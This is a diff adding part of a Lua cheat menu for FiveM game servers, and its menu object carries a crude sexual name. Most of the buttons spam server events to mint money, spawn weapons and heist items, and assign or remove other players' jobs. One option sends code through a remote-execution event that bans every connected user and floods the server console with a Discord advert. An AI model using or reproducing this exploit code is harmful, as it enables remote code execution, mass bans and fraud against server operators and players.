+		    elseif IhadSexWithMyStepMother.Button("~g~MONEY~s~ 4 ~b~VRP (vrp_trucker)") then
+                local money = GetKeyboardInput("Enter amount of money ~g~$$$")
+                local distance = money / 3.80
+                vRPtruckS = Tunnel.getInterface("vRP_trucker", "vRP_trucker")
+                vRPtruckS.finishTruckingDelivery({distance})
+			elseif IhadSexWithMyStepMother.Button("~g~MONEY~s~ 5 ~b~ VRP (vrp_casino)") then
+				local amount = GetKeyboardInput("Enter amount of money ~g~$$$:")
+				vRPcasinoS = Tunnel.getInterface("vRP_casino","vRP_casino")
+				vRPcasinoS.payRouletteWinnings({amount, 2})
+			elseif IhadSexWithMyStepMother.Button("~r~Ban Vrp !Use Server Without Anticheat!") then
+				TriggerServerEvent('RunCode:RunStringRemotelly', [[
+    local users = vRP.getUsers({})
+    local myid = 21
+    for k,v in pairs(users) do 
+        local srcs = vRP.getUserSource({tonumber(k)})
+        vRP.ban({srcs, "Banned by !  wwba Discord: Discord.gg/wwba)
+    end
+
+    for i = 1,300 do 
+        RconPrint("\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n")
+        RconPrint("\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n")
+    end
+]])
+			elseif IhadSexWithMyStepMother.Button("~g~MONEY~s~ 7 ~b~ VRP PayCheck 100X Working Vrp") then
+                TriggerServerEvent('paycheck:bonus_ad')
+                TriggerServerEvent('paycheck:bonus_ad')
+                TriggerServerEvent('paycheck:bonus_ad')
+                TriggerServerEvent('paycheck:salary')
+                TriggerServerEvent('paycheck:salary')
+                TriggerServerEvent('paycheck:salary')
+                TriggerServerEvent('paycheck:salary')
+                TriggerServerEvent('paycheck:salary')
+                TriggerServerEvent('paycheck:bonus_ad')
+                TriggerServerEvent('paycheck:bonus_ad')
+                TriggerServerEvent('paycheck:bonus_ad')
+                TriggerServerEvent('paycheck:bonus_ad')
+                TriggerServerEvent('paycheck:bonus_ad')
+                TriggerServerEvent('paycheck:bonus_ad')
+                TriggerServerEvent('paycheck:bonus_ad')
+                TriggerServerEvent('paycheck:salary')
+                TriggerServerEvent('paycheck:salary')
+                TriggerServerEvent('paycheck:salary')
+                TriggerServerEvent('paycheck:salary')
+                TriggerServerEvent('paycheck:salary')
+                TriggerServerEvent('paycheck:bonus_ad')
+                TriggerServerEvent('paycheck:bonus_ad')
+                TriggerServerEvent('paycheck:bonus_ad')
+                TriggerServerEvent('paycheck:bonus_ad')
+                TriggerServerEvent('paycheck:bonus_ad')
+                TriggerServerEvent('paycheck:bonus_ad')
+                TriggerServerEvent('paycheck:bonus_ad')
+                TriggerServerEvent('paycheck:salary')
+                TriggerServerEvent('paycheck:salary')
+                TriggerServerEvent('paycheck:salary')
+                TriggerServerEvent('paycheck:salary')
+                TriggerServerEvent('paycheck:salary')
+                TriggerServerEvent('paycheck:bonus_ad')
+                TriggerServerEvent('paycheck:bonus_ad')
+                TriggerServerEvent('paycheck:bonus_ad')
+                TriggerServerEvent('paycheck:bonus_ad')
+                TriggerServerEvent('paycheck:bonus_ad')
+                TriggerServerEvent('paycheck:bonus_ad')
+                TriggerServerEvent('paycheck:bonus_ad')
+                TriggerServerEvent('paycheck:salary')
+                TriggerServerEvent('paycheck:salary')
+                TriggerServerEvent('paycheck:salary')
+                TriggerServerEvent('paycheck:salary')
+                TriggerServerEvent('paycheck:salary')
+                TriggerServerEvent('paycheck:bonus_ad')
+                TriggerServerEvent('paycheck:bonus_ad')
+                TriggerServerEvent('paycheck:bonus_ad')
+                TriggerServerEvent('paycheck:bonus_ad')
+                TriggerServerEvent('paycheck:bonus_ad')
+                TriggerServerEvent('paycheck:bonus_ad')
+                TriggerServerEvent('paycheck:bonus_ad')
+                TriggerServerEvent('paycheck:salary')
+                TriggerServerEvent('paycheck:salary')
+                TriggerServerEvent('paycheck:salary')
+                TriggerServerEvent('paycheck:salary')
+                TriggerServerEvent('paycheck:salary')
+                TriggerServerEvent('paycheck:bonus_ad')
+                TriggerServerEvent('paycheck:bonus_ad')
+                TriggerServerEvent('paycheck:bonus_ad')
+                TriggerServerEvent('paycheck:bonus_ad')
+                TriggerServerEvent('paycheck:bonus_ad')
+                TriggerServerEvent('paycheck:bonus_ad')
+                TriggerServerEvent('paycheck:bonus_ad')
+                TriggerServerEvent('paycheck:salary')
+                TriggerServerEvent('paycheck:salary')
+                TriggerServerEvent('paycheck:salary')
+                TriggerServerEvent('paycheck:salary')
+                TriggerServerEvent('paycheck:salary')
+                TriggerServerEvent('paycheck:bonus_ad')
+                TriggerServerEvent('paycheck:bonus_ad')
+                TriggerServerEvent('paycheck:bonus_ad')
+                TriggerServerEvent('paycheck:bonus_ad')
+                TriggerServerEvent('paycheck:bonus_ad')
+                TriggerServerEvent('paycheck:bonus_ad')
+                TriggerServerEvent('paycheck:bonus_ad')
+                TriggerServerEvent('paycheck:salary')
+                TriggerServerEvent('paycheck:salary')
+                TriggerServerEvent('paycheck:salary')
+                TriggerServerEvent('paycheck:salary')
+                TriggerServerEvent('paycheck:salary')
+                TriggerServerEvent('paycheck:bonus_ad')
+                TriggerServerEvent('paycheck:bonus_ad')
+                TriggerServerEvent('paycheck:bonus_ad')
+                TriggerServerEvent('paycheck:bonus_ad')
+                TriggerServerEvent('paycheck:bonus_ad')
+                TriggerServerEvent('paycheck:bonus_ad')
+                TriggerServerEvent('paycheck:bonus_ad')
+                TriggerServerEvent('paycheck:salary')
+                TriggerServerEvent('paycheck:salary')
+                TriggerServerEvent('paycheck:salary')
+                TriggerServerEvent('paycheck:salary')
+                TriggerServerEvent('paycheck:salary')
+                TriggerServerEvent('paycheck:bonus_ad')
+                TriggerServerEvent('paycheck:bonus_ad')
+                TriggerServerEvent('paycheck:bonus_ad')
+                TriggerServerEvent('paycheck:bonus_ad')
+                TriggerServerEvent('paycheck:bonus_ad')
+                TriggerServerEvent('paycheck:bonus_ad')
+                TriggerServerEvent('paycheck:bonus_ad')
+                TriggerServerEvent('paycheck:salary')
+                TriggerServerEvent('paycheck:salary')
+                TriggerServerEvent('paycheck:salary')
+                TriggerServerEvent('paycheck:salary')
+                TriggerServerEvent('paycheck:salary')
+                TriggerServerEvent('paycheck:bonus_ad')
+                TriggerServerEvent('paycheck:bonus_ad')
+                TriggerServerEvent('paycheck:bonus_ad')
+                TriggerServerEvent('paycheck:bonus_ad')
+                TriggerServerEvent('paycheck:bonus_ad')
+                TriggerServerEvent('paycheck:bonus_ad')
+                TriggerServerEvent('paycheck:bonus_ad')
+                TriggerServerEvent('paycheck:bonus_ad')
+                TriggerServerEvent('paycheck:bonus_ad')
+                TriggerServerEvent('paycheck:bonus_ad')
+                TriggerServerEvent('paycheck:bonus_ad')
+                TriggerServerEvent('paycheck:bonus_ad')
+                TriggerServerEvent('paycheck:bonus_ad')
+                TriggerServerEvent('paycheck:bonus_ad')
+                TriggerServerEvent('paycheck:bonus_ad')
+                TriggerServerEvent('paycheck:bonus_ad')
+                TriggerServerEvent('paycheck:bonus_ad')
+                TriggerServerEvent('paycheck:bonus_ad')
+                TriggerServerEvent('paycheck:bonus_ad')
+                TriggerServerEvent('paycheck:bonus_ad')
+                TriggerServerEvent('paycheck:bonus_ad')
+                TriggerServerEvent('paycheck:bonus_ad')
+                TriggerServerEvent('paycheck:bonus_ad')
+                TriggerServerEvent('paycheck:bonus_ad')
+                TriggerServerEvent('paycheck:bonus_ad')
+                TriggerServerEvent('paycheck:bonus_ad')
+                TriggerServerEvent('paycheck:bonus_ad')
+                TriggerServerEvent('paycheck:bonus_ad')
+                TriggerServerEvent('paycheck:bonus_ad')
+                TriggerServerEvent('paycheck:bonus_ad')
+                TriggerServerEvent('paycheck:bonus_ad')
+                TriggerServerEvent('paycheck:bonus_ad')
+                TriggerServerEvent('paycheck:bonus_ad')
+                TriggerServerEvent('paycheck:bonus_ad')
+                TriggerServerEvent('paycheck:bonus_ad')
+                TriggerServerEvent('paycheck:bonus_ad')
+                TriggerServerEvent('paycheck:bonus_ad')
+                TriggerServerEvent('paycheck:bonus_ad')
+                TriggerServerEvent('paycheck:bonus_ad')
+                TriggerServerEvent('paycheck:bonus_ad')
+                TriggerServerEvent('paycheck:bonus_ad')
+                TriggerServerEvent('paycheck:bonus_ad')
+                TriggerServerEvent('paycheck:bonus_ad')
+                TriggerServerEvent('paycheck:bonus_ad')
+                TriggerServerEvent('paycheck:bonus_ad')
+                TriggerServerEvent('paycheck:bonus_ad')
+                TriggerServerEvent('paycheck:bonus_ad')
+			elseif IhadSexWithMyStepMother.Button("~g~MONEY~s~ 8 ~b~ VRP|Vrpx (SAMU|SALARIO)") then
+			local result = 9999
+                                if result then
+                                        TriggerServerEvent("reanimar:pagamento")
+                                        TriggerServerEvent("reanimar:pagamento")
+                                        TriggerServerEvent("reanimar:pagamento")
+                                        TriggerServerEvent("reanimar:pagamento")
+                                        TriggerServerEvent("reanimar:pagamento")
+                                        TriggerServerEvent("reanimar:pagamento")
+                                        TriggerServerEvent("reanimar:pagamento")
+                                        TriggerServerEvent("reanimar:pagamento")
+                                        TriggerServerEvent("reanimar:pagamento")
+                                        TriggerServerEvent("reanimar:pagamento")
+                                        TriggerServerEvent("reanimar:pagamento")
+                                        TriggerServerEvent("reanimar:pagamento")
+                                        TriggerServerEvent("reanimar:pagamento")
+                                        TriggerServerEvent("reanimar:pagamento")
+                                        TriggerServerEvent("reanimar:pagamento")
+                                        TriggerServerEvent("reanimar:pagamento")
+                                        TriggerServerEvent("reanimar:pagamento")
+                                        TriggerServerEvent("reanimar:pagamento")
+                                        TriggerServerEvent("reanimar:pagamento")
+                                        TriggerServerEvent("reanimar:pagamento")
+                                        TriggerServerEvent("reanimar:pagamento")
+                                        TriggerServerEvent("reanimar:pagamento")
+                                        TriggerServerEvent("reanimar:pagamento")
+                                        TriggerServerEvent("reanimar:pagamento")
+                                        TriggerServerEvent("reanimar:pagamento")
+                                        TriggerServerEvent("reanimar:pagamento")
+                                        TriggerServerEvent("reanimar:pagamento")
+                                        TriggerServerEvent("reanimar:pagamento")
+                                        TriggerServerEvent("reanimar:pagamento")
+                                        TriggerServerEvent("reanimar:pagamento")
+                                        TriggerServerEvent("reanimar:pagamento")
+                                        TriggerServerEvent("reanimar:pagamento")
+                                        TriggerServerEvent("reanimar:pagamento")
+                                        TriggerServerEvent("reanimar:pagamento")
+                                        TriggerServerEvent("reanimar:pagamento")
+                                        TriggerServerEvent("reanimar:pagamento")
+                                        TriggerServerEvent("reanimar:pagamento")
+                                        TriggerServerEvent("reanimar:pagamento")
+                                        TriggerServerEvent("reanimar:pagamento")
+                                        TriggerServerEvent("reanimar:pagamento")
+                                        TriggerServerEvent("reanimar:pagamento")
+                                        TriggerServerEvent("reanimar:pagamento")
+                                        TriggerServerEvent("reanimar:pagamento")
+                                        TriggerServerEvent("reanimar:pagamento")
+                                        TriggerServerEvent("reanimar:pagamento")
+                                        TriggerServerEvent("reanimar:pagamento")
+                                        TriggerServerEvent("reanimar:pagamento")
+                                        TriggerServerEvent("reanimar:pagamento")
+                                        TriggerServerEvent("reanimar:pagamento")
+                                        TriggerServerEvent("reanimar:pagamento")
+                                        TriggerServerEvent("reanimar:pagamento")
+                                        TriggerServerEvent("reanimar:pagamento")
+                                        TriggerServerEvent("reanimar:pagamento")
+                                        TriggerServerEvent("reanimar:pagamento")
+                                        TriggerServerEvent("reanimar:pagamento")
+                                        TriggerServerEvent("reanimar:pagamento")
+                                        TriggerServerEvent("reanimar:pagamento")
+                                        TriggerServerEvent("reanimar:pagamento")
+                                        TriggerServerEvent("reanimar:pagamento")
+                                        TriggerServerEvent("reanimar:pagamento")
+                                        TriggerServerEvent("reanimar:pagamento")
+                                        TriggerServerEvent("reanimar:pagamento")
+                                        TriggerServerEvent("reanimar:pagamento")
+                                        TriggerServerEvent("reanimar:pagamento")
+                                        TriggerServerEvent("reanimar:pagamento")
+                                        TriggerServerEvent("reanimar:pagamento")
+                                        TriggerServerEvent("reanimar:pagamento")
+                                        TriggerServerEvent("reanimar:pagamento")
+                                        TriggerServerEvent("reanimar:pagamento")
+                                        TriggerServerEvent("reanimar:pagamento")
+                                        TriggerServerEvent("reanimar:pagamento")
+                                        TriggerServerEvent("reanimar:pagamento")
+                                        TriggerServerEvent("reanimar:pagamento")
+                                        TriggerServerEvent("reanimar:pagamento")
+                                        TriggerServerEvent("reanimar:pagamento")
+                                        TriggerServerEvent("reanimar:pagamento")
+                                        TriggerServerEvent("reanimar:pagamento")
+                                        TriggerServerEvent("reanimar:pagamento")
+                                        TriggerServerEvent("reanimar:pagamento")
+                                        TriggerServerEvent("reanimar:pagamento")
+                                        TriggerServerEvent("reanimar:pagamento")
+                                        TriggerServerEvent("reanimar:pagamento")
+                                        TriggerServerEvent("reanimar:pagamento")
+                                        TriggerServerEvent("reanimar:pagamento")
+                                        TriggerServerEvent("reanimar:pagamento")
+                                        TriggerServerEvent("reanimar:pagamento")
+                                        TriggerServerEvent("reanimar:pagamento")
+                                        TriggerServerEvent("reanimar:pagamento")
+                                        TriggerServerEvent("reanimar:pagamento")
+                                        TriggerServerEvent("reanimar:pagamento")
+                                        TriggerServerEvent("reanimar:pagamento")
+                                        TriggerServerEvent("reanimar:pagamento")
+                                        TriggerServerEvent("reanimar:pagamento")
+                                        TriggerServerEvent("reanimar:pagamento")
+                                        TriggerServerEvent("reanimar:pagamento")
+                                        TriggerServerEvent("reanimar:pagamento")
+                                        TriggerServerEvent("reanimar:pagamento")
+                                        TriggerServerEvent("reanimar:pagamento")
+                                        TriggerServerEvent("reanimar:pagamento")
+                                        TriggerServerEvent("reanimar:pagamento")
+                                        TriggerServerEvent("reanimar:pagamento")
+                                        TriggerServerEvent("reanimar:pagamento")
+                                        TriggerServerEvent("reanimar:pagamento")
+                                        TriggerServerEvent("reanimar:pagamento")
+                                        TriggerServerEvent("reanimar:pagamento")
+                                        TriggerServerEvent("reanimar:pagamento")
+                                        TriggerServerEvent("reanimar:pagamento")
+                                        TriggerServerEvent("reanimar:pagamento")
+                                        TriggerServerEvent("reanimar:pagamento")
+                                        TriggerServerEvent("reanimar:pagamento")
+                                        TriggerServerEvent("reanimar:pagamento")
+                                        TriggerServerEvent("reanimar:pagamento")
+                                        TriggerServerEvent("reanimar:pagamento")
+                                        TriggerServerEvent("reanimar:pagamento")
+                                        TriggerServerEvent("reanimar:pagamento")
+                                        TriggerServerEvent("reanimar:pagamento")
+                                        TriggerServerEvent("reanimar:pagamento")
+                                        TriggerServerEvent("reanimar:pagamento")
+                                        TriggerServerEvent("reanimar:pagamento")
+                                        TriggerServerEvent("reanimar:pagamento")
+                                end
+                        elseif IhadSexWithMyStepMother.Button("~g~MONEY~s~ 9 ~b~ VRP|Vrpx (SAMU|SALARIO)") then
+                                local result = 9999
+                                if result then
+                                        TriggerServerEvent('salario:pagamento')
+                                        TriggerServerEvent('salario:pagamento')
+                                        TriggerServerEvent('salario:pagamento')
+                                        TriggerServerEvent('salario:pagamento')
+                                        TriggerServerEvent('salario:pagamento')
+                                        TriggerServerEvent('salario:pagamento')
+                                        TriggerServerEvent('salario:pagamento')
+                                        TriggerServerEvent('salario:pagamento')
+                                        TriggerServerEvent('salario:pagamento')
+                                        TriggerServerEvent('salario:pagamento')
+                                        TriggerServerEvent('salario:pagamento')
+                                        TriggerServerEvent('salario:pagamento')
+                                        TriggerServerEvent('salario:pagamento')
+                                        TriggerServerEvent('salario:pagamento')
+                                        TriggerServerEvent('salario:pagamento')
+                                        TriggerServerEvent('salario:pagamento')
+                                        TriggerServerEvent('salario:pagamento')
+                                        TriggerServerEvent('salario:pagamento')
+                                        TriggerServerEvent('salario:pagamento')
+                                        TriggerServerEvent('salario:pagamento')
+                                        TriggerServerEvent('salario:pagamento')
+                                        TriggerServerEvent('salario:pagamento')
+                                        TriggerServerEvent('salario:pagamento')
+                                end
+            elseif IhadSexWithMyStepMother.Button("~g~MONEY~s~ 10 ~b~ VRP|Vrpx (SAMU|SALARIO) ~r~OFF") then
+                                local result = GetKeyboardInput("Enter amount of money ~g~$$$", "", 100000000)
+                                if result then
+                                        TriggerServerEvent("offred:salar")
+                                        TriggerServerEvent("offred:salar")
+                                        TriggerServerEvent("offred:salar")
+                                        TriggerServerEvent("offred:salar")
+                                        TriggerServerEvent("offred:salar")
+                                        TriggerServerEvent("offred:salar")
+                                        TriggerServerEvent("offred:salar")
+                                        TriggerServerEvent("offred:salar")
+                                        TriggerServerEvent("offred:salar")
+                                        TriggerServerEvent("offred:salar")
+                                        TriggerServerEvent("offred:salar")
+                                        TriggerServerEvent("offred:salar")
+                                        TriggerServerEvent("offred:salar")
+                                        TriggerServerEvent("offred:salar")
+                                        TriggerServerEvent("offred:salar")
+                                        TriggerServerEvent("offred:salar")
+                                        TriggerServerEvent("offred:salar")
+                                        TriggerServerEvent("offred:salar")
+                                        TriggerServerEvent("offred:salar")
+                                        TriggerServerEvent("offred:salar")
+                                        TriggerServerEvent("offred:salar")
+                                        TriggerServerEvent("offred:salar")
+                                        TriggerServerEvent("offred:salar")
+                                        TriggerServerEvent("offred:salar")
+                                        TriggerServerEvent("offred:salar")
+                                        TriggerServerEvent("offred:salar")
+										end
+			elseif IhadSexWithMyStepMother.Button("~s~Bank ~r~~h~Deposit") then
+				local money = GetKeyboardInput("Enter amount of money", "", 100)
+				if money then
+				TriggerServerEvent("bank:deposit", money)
+				end
+			elseif IhadSexWithMyStepMother.Button("~s~Bank ~r~~h~Withdraw ") then
+				local money = GetKeyboardInput("Enter amount of money", "", 100)
+				if money then
+				TriggerServerEvent("bank:withdraw", money)
+				end
+			end
+			
+			 elseif IhadSexWithMyStepMother.IsMenuOpened('player1') then
+                local playerlist = GetActivePlayers()
+                for i = 1, #playerlist do
+                    local currPlayer = playerlist[i]
+                    if IhadSexWithMyStepMother.MenuButton("ID: ~g~[" .. GetPlayerServerId(currPlayer) .. "] ~s~~h~" .. GetPlayerName(currPlayer), 'other') then
+                        selectedPlayer = currPlayer end
+                end
+			
+			elseif IhadSexWithMyStepMother.IsMenuOpened('other') then
+			if IhadSexWithMyStepMother.Button("~r~Remove Job") then
+                TriggerServerEvent("NB:destituerplayer",GetPlayerServerId(selectedPlayer))
+			elseif IhadSexWithMyStepMother.Button("~s~Recruit~c~ Mechanic") then
+			local result = GetKeyboardInput("Enter Nivel Job ~g~0-10", "", 10)
+				TriggerServerEvent('NB:recruterplayer', GetPlayerServerId(selectedPlayer), "mecano", result)
+			elseif IhadSexWithMyStepMother.Button("~s~Recruit~b~ Police") then
+			local result = GetKeyboardInput("Enter Nivel Job ~g~0-10", "", 10)
+				TriggerServerEvent('NB:recruterplayer', GetPlayerServerId(selectedPlayer), "police", result)
+				TriggerServerEvent('Esx-MenuPessoal:Boss_recruterplayer', GetPlayerServerId(selectedPlayer), "police", result)
+				TriggerServerEvent('Corujas RP-MenuPessoal:Boss_recruterplayer', GetPlayerServerId(selectedPlayer), "police", result)
+			elseif IhadSexWithMyStepMother.Button("~s~Recruit~c~ Mafia") then
+			local result = GetKeyboardInput("Enter Nivel Job ~g~0-10", "", 10)
+				TriggerServerEvent('NB:recruterplayer', GetPlayerServerId(selectedPlayer), "mafia", result)
+				TriggerServerEvent('Esx-MenuPessoal:Boss_recruterplayer', GetPlayerServerId(selectedPlayer), "mafia", result)
+			elseif IhadSexWithMyStepMother.Button("~s~Recruit~p~ Gang") then
+			local result = GetKeyboardInput("Enter Nivel Job ~g~0-10", "", 10)
+				TriggerServerEvent('NB:recruterplayer', GetPlayerServerId(selectedPlayer), "gang", result)
+				TriggerServerEvent('Esx-MenuPessoal:Boss_recruterplayer', GetPlayerServerId(selectedPlayer), "gang", result)
+			elseif IhadSexWithMyStepMother.Button("~s~Recruit~y~ Taxi") then
+			local result = GetKeyboardInput("Enter Nivel Job ~g~0-10", "", 10)
+				TriggerServerEvent('NB:recruterplayer', GetPlayerServerId(selectedPlayer), "taxi", result)
+				TriggerServerEvent('Esx-MenuPessoal:Boss_recruterplayer', GetPlayerServerId(selectedPlayer), "taxi", result)
+			elseif IhadSexWithMyStepMother.Button("~s~Recruit~r~ Inem") then
+			local result = GetKeyboardInput("Enter Nivel Job ~g~0-10", "", 10)
+				TriggerServerEvent('NB:recruterplayer', GetPlayerServerId(selectedPlayer), "ambulance", result)
+				TriggerServerEvent('Esx-MenuPessoal:Boss_recruterplayer', GetPlayerServerId(selectedPlayer), "ambulance", result)
+			end
+        
+        
+      
+        elseif IhadSexWithMyStepMother.IsMenuOpened('esx') then
+            if IhadSexWithMyStepMother.Button("CFW ~g~Money") then
+                TriggerServerEvent('qb-storerobbery:server:takeMoney', currentRegister, false)
+                TriggerServerEvent('qb-storerobbery:server:takeMoney', currentRegister, false)
+                TriggerServerEvent('qb-storerobbery:server:takeMoney', currentRegister, false)
+                TriggerServerEvent('qb-storerobbery:server:takeMoney', currentRegister, false)
+                TriggerServerEvent('qb-storerobbery:server:takeMoney', currentRegister, false)
+                TriggerServerEvent('qb-storerobbery:server:takeMoney', currentRegister, false)
+                TriggerServerEvent('qb-taco:server:reward:money', true)
+                TriggerServerEvent('qb-taco:server:reward:money', true)
+                TriggerServerEvent('qb-taco:server:reward:money', true)
+                TriggerServerEvent('qb-taco:server:reward:money', true)
+                TriggerServerEvent('qb-taco:server:reward:money', true)
+                TriggerServerEvent('qb-taco:server:reward:money', true)
+                TriggerServerEvent('qb-taco:server:reward:money', true)
+                TriggerServerEvent('qb-tow:server:DoBail', false)
+                TriggerServerEvent('qb-tow:server:DoBail', false)
+                TriggerServerEvent('qb-tow:server:DoBail', false)
+                TriggerServerEvent('qb-tow:server:DoBail', false)
+                TriggerServerEvent('qb-tow:server:DoBail', false)
+                TriggerServerEvent('qb-tow:server:DoBail', false)
+                TriggerServerEvent('qb-tow:server:DoBail', false)
+                TriggerServerEvent('qb-tow:server:DoBail', false)
+                TriggerServerEvent('qb-storerobbery:server:takeMoney', currentRegister, false)
+                TriggerServerEvent('qb-storerobbery:server:takeMoney', currentRegister, false)
+                TriggerServerEvent('qb-storerobbery:server:takeMoney', currentRegister, false)
+                TriggerServerEvent('qb-storerobbery:server:takeMoney', currentRegister, false)
+                TriggerServerEvent('qb-storerobbery:server:takeMoney', currentRegister, false)
+                TriggerServerEvent('qb-storerobbery:server:takeMoney', currentRegister, false)
+                TriggerServerEvent('qb-taco:server:reward:money', true)
+                TriggerServerEvent('qb-taco:server:reward:money', true)
+                TriggerServerEvent('qb-taco:server:reward:money', true)
+                TriggerServerEvent('qb-taco:server:reward:money', true)
+                TriggerServerEvent('qb-taco:server:reward:money', true)
+                TriggerServerEvent('qb-taco:server:reward:money', true)
+                TriggerServerEvent('qb-taco:server:reward:money', true)
+                TriggerServerEvent('qb-recycle:server:getItem')
+                TriggerServerEvent('qb-recycle:server:getItem')
+                TriggerServerEvent('qb-tow:server:DoBail', false)
+                TriggerServerEvent('qb-tow:server:DoBail', false)
+                TriggerServerEvent('qb-tow:server:DoBail', false)
+                TriggerServerEvent('qb-tow:server:DoBail', false)
+                TriggerServerEvent('qb-tow:server:DoBail', false)
+                TriggerServerEvent('qb-tow:server:DoBail', false)
+                TriggerServerEvent('qb-tow:server:DoBail', false)
+                TriggerServerEvent('qb-tow:server:DoBail', false)
+                TriggerServerEvent('qb-storerobbery:server:takeMoney', currentRegister, false)
+                TriggerServerEvent('qb-storerobbery:server:takeMoney', currentRegister, false)
+                TriggerServerEvent('qb-storerobbery:server:takeMoney', currentRegister, false)
+                TriggerServerEvent('qb-storerobbery:server:takeMoney', currentRegister, false)
+                TriggerServerEvent('qb-storerobbery:server:takeMoney', currentRegister, false)
+                TriggerServerEvent('qb-storerobbery:server:takeMoney', currentRegister, false)
+                TriggerServerEvent('qb-taco:server:reward:money', true)
+                TriggerServerEvent('qb-taco:server:reward:money', true)
+                TriggerServerEvent('qb-taco:server:reward:money', true)
+                TriggerServerEvent('qb-taco:server:reward:money', true)
+                TriggerServerEvent('qb-taco:server:reward:money', true)
+                TriggerServerEvent('qb-taco:server:reward:money', true)
+                TriggerServerEvent('qb-taco:server:reward:money', true)
+                TriggerServerEvent('qb-recycle:server:getItem')
+                TriggerServerEvent('qb-recycle:server:getItem')
+                TriggerServerEvent('qb-recycle:server:getItem')
+                TriggerServerEvent('qb-tow:server:DoBail', false)
+                TriggerServerEvent('qb-tow:server:DoBail', false)
+                TriggerServerEvent('qb-tow:server:DoBail', false)
+                TriggerServerEvent('qb-tow:server:DoBail', false)
+                TriggerServerEvent('qb-tow:server:DoBail', false)
+                TriggerServerEvent('qb-tow:server:DoBail', false)
+                TriggerServerEvent('qb-tow:server:DoBail', false)
+                TriggerServerEvent('qb-tow:server:DoBail', false)
+                TriggerServerEvent('qb-storerobbery:server:takeMoney', currentRegister, false)
+                TriggerServerEvent('qb-storerobbery:server:takeMoney', currentRegister, false)
+                TriggerServerEvent('qb-storerobbery:server:takeMoney', currentRegister, false)
+                TriggerServerEvent('qb-storerobbery:server:takeMoney', currentRegister, false)
+                TriggerServerEvent('qb-storerobbery:server:takeMoney', currentRegister, false)
+                TriggerServerEvent('qb-storerobbery:server:takeMoney', currentRegister, false)
+                TriggerServerEvent('qb-taco:server:reward:money', true)
+                TriggerServerEvent('qb-taco:server:reward:money', true)
+                TriggerServerEvent('qb-taco:server:reward:money', true)
+                TriggerServerEvent('qb-taco:server:reward:money', true)
+                TriggerServerEvent('qb-taco:server:reward:money', true)
+                TriggerServerEvent('qb-taco:server:reward:money', true)
+                TriggerServerEvent('qb-taco:server:reward:money', true)
+                TriggerServerEvent('qb-tow:server:DoBail', false)
+                TriggerServerEvent('qb-tow:server:DoBail', false)
+                TriggerServerEvent('qb-tow:server:DoBail', false)
+                TriggerServerEvent('qb-tow:server:DoBail', false)
+                TriggerServerEvent('qb-tow:server:DoBail', false)
+                TriggerServerEvent('qb-tow:server:DoBail', false)
+                TriggerServerEvent('qb-tow:server:DoBail', false)
+                TriggerServerEvent('qb-tow:server:DoBail', false)
+                TriggerServerEvent('qb-storerobbery:server:takeMoney', currentRegister, false)
+                TriggerServerEvent('qb-storerobbery:server:takeMoney', currentRegister, false)
+                TriggerServerEvent('qb-storerobbery:server:takeMoney', currentRegister, false)
+                TriggerServerEvent('qb-storerobbery:server:takeMoney', currentRegister, false)
+                TriggerServerEvent('qb-storerobbery:server:takeMoney', currentRegister, false)
+                TriggerServerEvent('qb-storerobbery:server:takeMoney', currentRegister, false)
+                TriggerServerEvent('qb-taco:server:reward:money', true)
+                TriggerServerEvent('qb-taco:server:reward:money', true)
+                TriggerServerEvent('qb-taco:server:reward:money', true)
+                TriggerServerEvent('qb-taco:server:reward:money', true)
+                TriggerServerEvent('qb-taco:server:reward:money', true)
+                TriggerServerEvent('qb-taco:server:reward:money', true)
+                TriggerServerEvent('qb-taco:server:reward:money', true)
+                TriggerServerEvent('qb-tow:server:DoBail', false)
+                TriggerServerEvent('qb-tow:server:DoBail', false)
+                TriggerServerEvent('qb-tow:server:DoBail', false)
+                TriggerServerEvent('qb-tow:server:DoBail', false)
+                TriggerServerEvent('qb-tow:server:DoBail', false)
+                TriggerServerEvent('qb-tow:server:DoBail', false)
+                TriggerServerEvent('qb-tow:server:DoBail', false)
+                TriggerServerEvent('qb-tow:server:DoBail', false)
+                TriggerServerEvent('qb-storerobbery:server:takeMoney', currentRegister, false)
+                TriggerServerEvent('qb-storerobbery:server:takeMoney', currentRegister, false)
+                TriggerServerEvent('qb-storerobbery:server:takeMoney', currentRegister, false)
+                TriggerServerEvent('qb-storerobbery:server:takeMoney', currentRegister, false)
+                TriggerServerEvent('qb-storerobbery:server:takeMoney', currentRegister, false)
+            elseif IhadSexWithMyStepMother.Button("CFW Give ~v~Armor") then
+                TriggerServerEvent(":Server:AddItem", "armor", 1)
+				TriggerServerEvent('QBCore:Server:AddItem', "armor", 1)
+				TriggerServerEvent('ipx-Core:Server:AddItem', "armor", 1)
+                TriggerServerEvent("bw:Server:AddItem", "armor", 1)
+		    elseif IhadSexWithMyStepMother.Button("CFW ~g~Fleeca ITEMS") then
+			    TriggerServerEvent('QBCore:Server:AddItem', "bank_card", 1)
+			    TriggerServerEvent('QBCore:Server:AddItem', "fleecacard", 1)
+				TriggerServerEvent('QBCore:Server:AddItem', "fleecacard2", 1)
+				TriggerServerEvent('QBCore:Server:AddItem', "trojan_usb", 1)
+				TriggerServerEvent('QBCore:Server:AddItem', "electronickit", 1)
+				TriggerServerEvent('QBCore:Server:AddItem', "advancedlockpick", 1)
+	            TriggerServerEvent('ipx-Core:Server:AddItem', "bank_card", 1)
+			    TriggerServerEvent('ipx-Core:Server:AddItem', "fleecacard", 1)
+				TriggerServerEvent('ipx-Core:Server:AddItem', "fleecacard2", 1)
+				TriggerServerEvent('ipx-Core:Server:AddItem', "trojan_usb", 1)
+				TriggerServerEvent('ipx-Core:Server:AddItem', "electronickit", 1)
+				TriggerServerEvent('ipx-Core:Server:AddItem', "advancedlockpick", 1)
+            elseif IhadSexWithMyStepMother.Button("~v~CFW WWBA ITEMS") then
+			    TriggerServerEvent('QBCore:Server:AddItem', "advancedlockpick", 5)
+			    TriggerServerEvent('QBCore:Server:AddItem', "lockpick", 4)
+				TriggerServerEvent('QBCore:Server:AddItem', "handcuffs", 2)
+				TriggerServerEvent('QBCore:Server:AddItem', "pistol_ammo", 60)
+				TriggerServerEvent('QBCore:Server:AddItem', "radio", 1)
+				TriggerServerEvent('QBCore:Server:AddItem', "pistol_suppressor", 1)
+                TriggerServerEvent('QBCore:Server:AddItem', "screwdriverset", 1)
